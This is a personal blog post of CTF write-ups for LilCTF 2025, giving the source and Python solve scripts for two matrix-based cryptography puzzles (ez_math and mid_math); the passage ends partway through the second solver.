<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>LilCTF2025-wp | ALe's Blog</title><meta name="author" content="ALe"><meta name="copyright" content="ALe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="比赛这两天一直在驾校练车，没时间打比赛，所以没出几道，排名也是很拉，就不放截图了 CRYPTO密码没学过，全是ai ez_math12345678910111213141516171819202122from sage.all import *from Crypto.Util.number import *flag &#x3D; b&#x27;LILCTF&#123;test_flag&#125;&amp;#x27">
<meta property="og:type" content="article">
<meta property="og:title" content="LilCTF2025-wp">
<meta property="og:url" content="https://ale1293528.github.io/2025/08/15/LilCTF2025-wp/index.html">
<meta property="og:site_name" content="ALe&#39;s Blog">
<meta property="og:description" content="比赛这两天一直在驾校练车，没时间打比赛，所以没出几道，排名也是很拉，就不放截图了 CRYPTO密码没学过，全是ai ez_math12345678910111213141516171819202122from sage.all import *from Crypto.Util.number import *flag &#x3D; b&#x27;LILCTF&#123;test_flag&#125;&amp;#x27">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ale1293528.github.io/img/mygo4.jpg">
<meta property="article:published_time" content="2025-08-15T12:53:12.000Z">
<meta property="article:modified_time" content="2025-08-19T10:42:32.015Z">
<meta property="article:author" content="ALe">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ale1293528.github.io/img/mygo4.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LilCTF2025-wp",
  "url": "https://ale1293528.github.io/2025/08/15/LilCTF2025-wp/",
  "image": "https://ale1293528.github.io/img/mygo4.jpg",
  "datePublished": "2025-08-15T12:53:12.000Z",
  "dateModified": "2025-08-19T10:42:32.015Z",
  "author": [
    {
      "@type": "Person",
      "name": "ALe",
      "url": "https://ale1293528.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ale1293528.github.io/2025/08/15/LilCTF2025-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'LilCTF2025-wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/mygo4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ALe's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">LilCTF2025-wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">LilCTF2025-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-15T12:53:12.000Z" title="Created 2025-08-15 20:53:12">2025-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-19T10:42:32.015Z" title="Updated 2025-08-19 18:42:32">2025-08-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>比赛这两天一直在驾校练车，没时间打比赛，所以没出几道，排名也是很拉，就不放截图了</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><p>密码没学过，全是ai</p>
<h3 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">flag = b&#x27;LILCTF&#123;test_flag&#125;&#x27;[7:-1]</span><br><span class="line">lambda1 = bytes_to_long(flag[:len(flag)//2])</span><br><span class="line">lambda2 = bytes_to_long(flag[len(flag)//2:])</span><br><span class="line">p = getPrime(512)</span><br><span class="line">def mul(vector, c):</span><br><span class="line">    return [vector[0]*c, vector[1]*c]</span><br><span class="line"></span><br><span class="line">v1 = [getPrime(128), getPrime(128)]</span><br><span class="line">v2 = [getPrime(128), getPrime(128)]</span><br><span class="line"></span><br><span class="line">A = matrix(GF(p), [v1, v2])</span><br><span class="line">B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])</span><br><span class="line">C = A.inverse() * B</span><br><span class="line"></span><br><span class="line">print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">print(f&#x27;C = &#123;str(C).replace(&quot; &quot;, &quot;,&quot;).replace(&quot;\n&quot;, &quot;,&quot;).replace(&quot;[,&quot;, &quot;[&quot;)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line"># p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br><span class="line"># C = [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],[7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]</span><br></pre></td></tr></table></figure>
<p>exp: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Recover lambda1, lambda2 from C = A^&#123;-1&#125; * (diag(lambda1, lambda2) * A)</span><br><span class="line"># Key: eigenvalues(C) over GF(p) are exactly lambda1, lambda2 (mod p).</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># ======= 填入已知参数（可替换）=======</span><br><span class="line">p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br><span class="line">C = [</span><br><span class="line">    [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,</span><br><span class="line">     7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],</span><br><span class="line">    [7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,</span><br><span class="line">     2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]</span><br><span class="line">]</span><br><span class="line"># 如果你要换数据，把上面 p、C 两个块替换掉即可。</span><br><span class="line"></span><br><span class="line"># ======= 工具函数（Tonelli–Shanks 求模平方根，适用于任意奇素数 p）=======</span><br><span class="line">def tonelli_shanks(n, p):</span><br><span class="line">    &quot;&quot;&quot;Solve x^2 ≡ n (mod p) for odd prime p. Return one root or None.&quot;&quot;&quot;</span><br><span class="line">    n %= p</span><br><span class="line">    if n == 0:</span><br><span class="line">        return 0</span><br><span class="line">    # Legendre symbol: n^((p-1)/2) ≡ 1 (residue) or p-1 (non-residue)</span><br><span class="line">    if pow(n, (p - 1) // 2, p) == p - 1:</span><br><span class="line">        return None  # not a quadratic residue</span><br><span class="line">    # Factor p-1 = q * 2^s with q odd</span><br><span class="line">    q = p - 1</span><br><span class="line">    s = 0</span><br><span class="line">    while q % 2 == 0:</span><br><span class="line">        q //= 2</span><br><span class="line">        s += 1</span><br><span class="line">    # Find a quadratic non-residue z</span><br><span class="line">    z = 2</span><br><span class="line">    while pow(z, (p - 1) // 2, p) != p - 1:</span><br><span class="line">        z += 1</span><br><span class="line">    c = pow(z, q, p)</span><br><span class="line">    x = pow(n, (q + 1) // 2, p)</span><br><span class="line">    t = pow(n, q, p)</span><br><span class="line">    m = s</span><br><span class="line">    while t != 1:</span><br><span class="line">        # find smallest i (0 &lt; i &lt; m) s.t. t^(2^i) == 1</span><br><span class="line">        i = 1</span><br><span class="line">        t2i = pow(t, 2, p)</span><br><span class="line">        while i &lt; m and t2i != 1:</span><br><span class="line">            t2i = pow(t2i, 2, p)</span><br><span class="line">            i += 1</span><br><span class="line">        b = pow(c, 1 &lt;&lt; (m - i - 1), p)</span><br><span class="line">        x = (x * b) % p</span><br><span class="line">        t = (t * b * b) % p</span><br><span class="line">        c = (b * b) % p</span><br><span class="line">        m = i</span><br><span class="line">    return x  # one of the square roots; the other is p - x</span><br><span class="line"></span><br><span class="line">def inv(a, p):</span><br><span class="line">    return pow(a, p - 2, p)  # Fermat, since p is prime</span><br><span class="line"></span><br><span class="line">def clean_bytes(x: int) -&gt; bytes:</span><br><span class="line">    return long_to_bytes(x).lstrip(b&quot;\x00&quot;)  # 去掉可能的前导 0</span><br><span class="line"></span><br><span class="line"># ======= 计算特征值（即 lambda1, lambda2）=======</span><br><span class="line">a, b = C[0]</span><br><span class="line">c, d = C[1]</span><br><span class="line">a %= p; b %= p; c %= p; d %= p</span><br><span class="line"></span><br><span class="line">trace = (a + d) % p</span><br><span class="line">det   = (a * d - b * c) % p</span><br><span class="line">disc  = (trace * trace - 4 * det) % p  # 判别式 Δ</span><br><span class="line"></span><br><span class="line">sqrt_disc = tonelli_shanks(disc, p)</span><br><span class="line">if sqrt_disc is None:</span><br><span class="line">    raise ValueError(&quot;判别式不是二次剩余，数据可能不一致或已损坏。&quot;)</span><br><span class="line"></span><br><span class="line">inv2 = inv(2, p)</span><br><span class="line">lam1 = ((trace + sqrt_disc) * inv2) % p</span><br><span class="line">lam2 = ((trace - sqrt_disc) * inv2) % p</span><br><span class="line"></span><br><span class="line">print(&quot;[+] lambda1 =&quot;, lam1)</span><br><span class="line">print(&quot;[+] lambda2 =&quot;, lam2)</span><br><span class="line"></span><br><span class="line"># ======= 尝试复原明文字节并给出候选 flag =======</span><br><span class="line">half1 = clean_bytes(lam1)</span><br><span class="line">half2 = clean_bytes(lam2)</span><br><span class="line"></span><br><span class="line">candidates = [</span><br><span class="line">    (half1 + half2, &quot;λ1 || λ2&quot;),</span><br><span class="line">    (half2 + half1, &quot;λ2 || λ1&quot;),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">KNOWN_PREFIX = b&quot;LILCTF&#123;&quot;</span><br><span class="line">KNOWN_SUFFIX = b&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">for body, desc in candidates:</span><br><span class="line">    print(f&quot;\n[+] Candidate (&#123;desc&#125;)&quot;)</span><br><span class="line">    print(&quot;    body bytes (hex):&quot;, body.hex())</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;    body utf-8     :&quot;, body.decode(&quot;utf-8&quot;))</span><br><span class="line">    except UnicodeDecodeError:</span><br><span class="line">        print(&quot;    body utf-8     : &lt;decode failed&gt;&quot;)</span><br><span class="line"></span><br><span class="line">    flag_bytes = KNOWN_PREFIX + body + KNOWN_SUFFIX</span><br><span class="line">    print(&quot;    flag bytes(hex):&quot;, flag_bytes.hex())</span><br><span class="line">    try:</span><br><span class="line">        print(&quot;    FLAG (utf-8)   :&quot;, flag_bytes.decode(&quot;utf-8&quot;))</span><br><span class="line">    except UnicodeDecodeError:</span><br><span class="line">        print(&quot;    FLAG (utf-8)   : &lt;decode failed&gt;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>LILCTF{It_w4s_the_be5t_of_times_1t_wa5_the_w0rst_of_t1me5}</p>
<h3 id="mid-math"><a href="#mid-math" class="headerlink" title="mid_math"></a>mid_math</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from random import randint</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line"></span><br><span class="line">flag = b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span><br><span class="line"></span><br><span class="line">p = getPrime(64)</span><br><span class="line">P = GF(p)</span><br><span class="line"></span><br><span class="line">key = randint(2**62, p)</span><br><span class="line"></span><br><span class="line">def mul(vector, c):</span><br><span class="line">    return [vector[0]*c, vector[1]*c, vector[2]*c, vector[3]*c, vector[4]*c]</span><br><span class="line"></span><br><span class="line">v1 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]</span><br><span class="line">v2 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]</span><br><span class="line">v3 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]</span><br><span class="line">v4 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]</span><br><span class="line">v5 = [getPrime(64), getPrime(64), getPrime(64), getPrime(64), getPrime(64)]</span><br><span class="line">a, b, c, d, e = getPrime(64), getPrime(64), getPrime(64), getPrime(64),  0</span><br><span class="line"></span><br><span class="line">A = matrix(P, [v1, v2, v3, v4, v5])</span><br><span class="line">B = matrix(P, [mul(v1,a), mul(v2,b), mul(v3, c), mul(v4, d), mul(v5, e)])</span><br><span class="line">C = A.inverse() * B</span><br><span class="line">D = C**key</span><br><span class="line"></span><br><span class="line">key = pad(long_to_bytes(key), 16)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">msg = aes.encrypt(pad(flag, 64))</span><br><span class="line"></span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&#x27;C = &#123;[i for i in C]&#125;&#x27;.replace(&#x27;(&#x27;, &#x27;[&#x27;).replace(&#x27;)&#x27;, &#x27;]&#x27;))</span><br><span class="line">print(f&#x27;D = &#123;[i for i in D]&#125;&#x27;.replace(&#x27;(&#x27;, &#x27;[&#x27;).replace(&#x27;)&#x27;, &#x27;]&#x27;))</span><br><span class="line">print(f&quot;msg = &#123;msg&#125;&quot;)</span><br><span class="line"></span><br><span class="line">#p = 14668080038311483271</span><br><span class="line">#C = [[11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212], [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914], [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670], [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 13902820281072641413], [1046075193917103481, 3617988773170202613, 3590111338369894405, 2646640112163975771, 5966864698750134707]]</span><br><span class="line">#D = [[1785348659555163021, 3612773974290420260, 8587341808081935796, 4393730037042586815, 10490463205723658044], [10457678631610076741, 1645527195687648140, 13013316081830726847, 12925223531522879912, 5478687620744215372], [9878636900393157276, 13274969755872629366, 3231582918568068174, 7045188483430589163, 5126509884591016427], [4914941908205759200, 7480989013464904670, 5860406622199128154, 8016615177615097542, 13266674393818320551], [3005316032591310201, 6624508725257625760, 7972954954270186094, 5331046349070112118, 6127026494304272395]]</span><br><span class="line">#msg = b&quot;\xcc]B:\xe8\xbc\x91\xe2\x93\xaa\x88\x17\xc4\xe5\x97\x87@\x0fd\xb5p\x81\x1e\x98,Z\xe1n`\xaf\xe0%:\xb7\x8aD\x03\xd2Wu5\xcd\xc4#m&#x27;\xa7\xa4\x80\x0b\xf7\xda8\x1b\x82k#\xc1gP\xbd/\xb5j&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<p>先用这个脚本跑出aes的key，但是flag是乱码，是因为把 AES 密钥用「补零」填充了，但出题脚本是用 pad(long_to_bytes(key), 16)（也就是 PKCS#7）去填充 AES key 的。把 AES key 按 PKCS#7 填充后再解密就能得到正确明文（然后对明文再用 blocksize&#x3D;64 的 PKCS#7 去掉 padding）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"># solve.py  -- pure Python exp (no Sage)</span><br><span class="line">import math</span><br><span class="line">from collections import Counter</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line">import sympy as sp</span><br><span class="line"></span><br><span class="line"># --------------------- paste instance data here ---------------------</span><br><span class="line">p = 14668080038311483271</span><br><span class="line">C = [</span><br><span class="line">    [11315841881544731102, 2283439871732792326, 6800685968958241983, 6426158106328779372, 9681186993951502212],</span><br><span class="line">    [4729583429936371197, 9934441408437898498, 12454838789798706101, 1137624354220162514, 8961427323294527914],</span><br><span class="line">    [12212265161975165517, 8264257544674837561, 10531819068765930248, 4088354401871232602, 14653951889442072670],</span><br><span class="line">    [6045978019175462652, 11202714988272207073, 13562937263226951112, 6648446245634067896, 